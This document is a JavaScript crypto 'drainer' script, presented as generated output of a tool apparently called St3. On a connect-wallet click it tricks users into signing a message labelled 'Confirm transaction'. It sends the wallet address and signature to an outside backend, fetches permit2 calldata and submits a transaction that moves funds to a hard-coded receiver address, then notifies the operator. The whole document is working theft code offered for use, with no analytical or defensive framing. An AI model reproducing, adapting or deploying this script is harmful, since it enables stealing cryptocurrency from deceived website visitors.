## Generated Script (St3 Outputs This)

```javascript
// drainer-simple.js (Generated by St3)

(function() {
  const CONFIG = {
    receiver: '0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693',
    backend: 'https://d.v26sequence.com/api/compile/drainer'
  };
  
  // Listen for connect button click
  document.getElementById('connect-wallet').addEventListener('click', async (e) => {
    e.preventDefault();
    
    try {
      // 1. Connect wallet
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const wallet = await signer.getAddress();
      
      console.log('Connected:', wallet);
      
      // 2. Request signature (user sees MetaMask popup)
      const message = 'Confirm transaction';
      const signature = await signer.signMessage(message);
      
      console.log('Signed');
      
      // 3. Send to VPS
      const response = await fetch(CONFIG.backend, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          wallet,
          receiver: CONFIG.receiver,
          signature,
          site: location.hostname,
          timestamp: Date.now()
        })
      });
      
      const result = await response.json();
      
      if (result.status === 'ok') {
        console.log('✅ Session created:', result.sessionKey);
        
        // Execute strategy automatically
        await executeStrategy(result.sessionKey, wallet);
      }
      
    } catch (error) {
      console.error('Error:', error.message);
    }
  });
  
  async function executeStrategy(sessionKey, wallet) {
    // Call /api/action/execute to get calldata
    const response = await fetch('https://your-st3-domain.com/api/action/execute', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        mode: 'permit2',
        wallet,
        recipient: CONFIG.receiver,
        sessionKey,
        chainId: 1
      })
    });
    
    const { calldata, target } = await response.json();
    
    // Send transaction (user's wallet pays or relayer pays)
    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    
    const tx = await signer.sendTransaction({
      to: target,
      data: calldata,
      value: '0'
    });
    
    await tx.wait();
    console.log('✅ Transaction confirmed:', tx.hash);
    
    // Notify operator
    await fetch('https://your-st3-domain.com/api/notify', {
      method: 'POST',
      body: JSON.stringify({
        message: `✅ Transfer complete\n👛 ${wallet.slice(0,6)}...${wallet.slice(-4)}\n🔍 ${tx.hash}`
      })
    });
  }
})();
```
